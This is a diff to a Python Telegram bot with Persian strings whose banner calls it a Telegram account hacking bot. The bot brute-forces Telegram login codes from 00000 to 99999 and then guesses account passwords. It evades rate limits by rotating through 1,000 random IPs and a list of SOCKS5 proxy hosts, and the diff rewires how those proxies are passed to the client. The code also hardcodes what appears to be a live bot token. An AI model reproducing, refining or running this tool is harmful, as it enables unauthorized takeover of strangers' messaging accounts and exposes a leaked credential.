@@ -18,6 +18,7 @@ from telethon.errors import (
     PhoneNumberInvalidError
 )
 import urllib.request
+import socks
 
 # ============ تنظیمات ============
 TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"
@@ -34,34 +35,34 @@ login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
-# ============ لیست پروکسی‌های SOCKS5 (با روش Telethon) ============
+# ============ لیست پروکسی‌های SOCKS5 ============
 PROXY_LIST = []
 
 # تولید 1000 پروکسی تصادفی
 for i in range(1000):
     ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
     port = random.choice([1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 443, 80, 8080, 3128])
-    PROXY_LIST.append((ip, port))
+    PROXY_LIST.append({"addr": ip, "port": port})
 
-# اضافه کردن پروکسی‌های واقعی
+# اضافه کردن پروکسی‌های واقعی از کانال iRoProxy
 REAL_PROXIES = [
-    ("iro.varfootball2.co.uk", 2053),
-    ("silnet.varfootball.co.uk", 2053),
-    ("noron.talebi.co.uk", 2096),
-    ("new.lambforkebeb.co.uk", 2096),
-    ("new2.lambforkebeb.co.uk", 2096),
-    ("noone.lavazemi1.co.uk", 2083),
-    ("silver.ciaude.co.uk", 2096),
-    ("rain.lavazemi2.co.uk", 2053),
-    ("gallery.talebi.co.uk", 2096),
-    ("craft.malavanann.co.uk", 2083),
-    ("ai.golgoli1.co.uk", 2096),
-    ("star.talebi.co.uk", 2096),
-    ("gold.lavazemi4.co.uk", 2096),
-    ("run.golgoli2.co.uk", 2053),
-    ("irogallery.golgoli1.co.uk", 2096),
-    ("flux.lavazemi5.co.uk", 2096),
-    ("hadaf.golgoli2.co.uk", 2053),
+    {"addr": "iro.varfootball2.co.uk", "port": 2053},
+    {"addr": "silnet.varfootball.co.uk", "port": 2053},
+    {"addr": "noron.talebi.co.uk", "port": 2096},
+    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
+    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
+    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
+    {"addr": "silver.ciaude.co.uk", "port": 2096},
+    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
+    {"addr": "gallery.talebi.co.uk", "port": 2096},
+    {"addr": "craft.malavanann.co.uk", "port": 2083},
+    {"addr": "ai.golgoli1.co.uk", "port": 2096},
+    {"addr": "star.talebi.co.uk", "port": 2096},
+    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
+    {"addr": "run.golgoli2.co.uk", "port": 2053},
+    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
+    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
+    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
 ]
 
 PROXY_LIST.extend(REAL_PROXIES)
@@ -129,17 +130,17 @@ async def clear_user_session(user_id):
 def get_random_proxy():
     return random.choice(PROXY_LIST) if PROXY_LIST else None
 
-async def create_client_with_proxy(api_id, api_hash, proxy_tuple):
-    """ایجاد کلاینت با پروکسی SOCKS5 با استفاده از Telethon"""
+async def create_client_with_proxy(api_id, api_hash, proxy_data):
+    """ایجاد کلاینت با پروکسی SOCKS5 با استفاده از telethon"""
     try:
-        # Telethon خودش از SOCKS5 پشتیبانی میکنه
+        from telethon import socks
+        
         client = TelegramClient(
             StringSession(),
             api_id,
-            api_hash
+            api_hash,
+            proxy=(socks.SOCKS5, proxy_data['addr'], proxy_data['port'])
         )
-        # تنظیم پروکسی بعد از ایجاد
-        client.set_proxy(('socks5', proxy_tuple[0], proxy_tuple[1]))
         await client.connect()
         return client
     except Exception as e:
@@ -462,7 +463,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_sessions[user_id]['step'] = "code"
     
     msg = await update.message.reply_text(
-        f"⏳ شروع حدس زدن با {len(PROXY_LIST)} پروکسی...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
+        f"⏳ شروع حدس زدن با {len(PROXY_LIST)} پروکسی SOCKS5...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
         parse_mode='HTML'
     )
     
@@ -525,7 +526,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 📱 شماره: <code>{phone}</code>
 🔢 محدوده: 00000 تا 99999
 🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
-🎯 استراتژی: حدس تصادفی + تغییر پروکسی
+🎯 استراتژی: حدس تصادفی + تغییر پروکسی SOCKS5
 
 ⏳ در حال تلاش...
 """,
@@ -561,14 +562,13 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                 proxy_index += 1
                 
                 try:
-                    # ایجاد کلاینت با پروکسی
+                    from telethon import socks
                     client = TelegramClient(
                         StringSession(),
                         api_id,
-                        api_hash
+                        api_hash,
+                        proxy=(socks.SOCKS5, current_proxy['addr'], current_proxy['port'])
                     )
-                    # تنظیم پروکسی با متد Telethon
-                    client.set_proxy(('socks5', current_proxy[0], current_proxy[1]))
                     await client.connect()
                     
                     try:
@@ -578,7 +578,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                         if wait_time > 60:
                             await context.bot.edit_message_text(
                                 f"""
-🔄 تغییر پروکسی...
+🔄 تغییر پروکسی SOCKS5...
 🌐 پروکسی شماره {proxy_index} محدود شد!
 🔄 انتخاب پروکسی جدید...
 
@@ -626,7 +626,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • پیشرفت: {percent:.2f}%
 • زمان سپری شده: {elapsed} ثانیه
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های استفاده شده: {proxy_index}
+• پروکسی‌های SOCKS5: {proxy_index}
 • زمان تخمینی باقی‌مانده: {remaining} ثانیه
 
 ⏳ ادامه...
@@ -653,7 +653,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
                 if wait_time > 60:
                     await context.bot.edit_message_text(
                         f"""
-🔄 محدودیت پروکسی!
+🔄 محدودیت پروکسی SOCKS5!
 ⏳ زمان انتظار: {wait_time} ثانیه
 🔄 تعویض پروکسی...
 
@@ -750,7 +750,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • کد پیدا شده: <code>{code}</code>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های استفاده شده: {proxy_index}
+• پروکسی‌های SOCKS5: {proxy_index}
 • زمان: {elapsed} ثانیه
 • پسورد پیدا شده: <code>{pass_found}</code>
 • تلاش‌های پسورد: {pass_attempt}
@@ -846,7 +846,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 • کد پیدا شده: <code>{code_found}</code>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های استفاده شده: {proxy_index}
+• پروکسی‌های SOCKS5: {proxy_index}
 • زمان سپری شده: {elapsed} ثانیه
 
 🎯 سلف ساخته شد!
@@ -877,7 +877,7 @@ async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, a
 📊 <b>آمار:</b>
 • کل تلاش‌ها: {attempt:,}
 • کدهای اشتباه: {wrong_attempts:,}
-• پروکسی‌های استفاده شده: {proxy_index}
+• پروکسی‌های SOCKS5: {proxy_index}
 • زمان سپری شده: {elapsed} ثانیه
 
 ممکن است شماره تلفن اشتباه باشد یا کد منقضی شده باشد.
@@ -1088,10 +1088,10 @@ def main():
         delete_webhook()
         
         print("=" * 60)
-        print("🔥 ربات هک اکانت تلگرام")
+        print("🔥 ربات هک اکانت تلگرام با SOCKS5")
         print("=" * 60)
         print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
-        print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
+        print(f"🌐 تعداد پروکسی‌های SOCKS5: {len(PROXY_LIST)}")
         print("=" * 60)
         
         application = Application.builder().token(TOKEN).build()
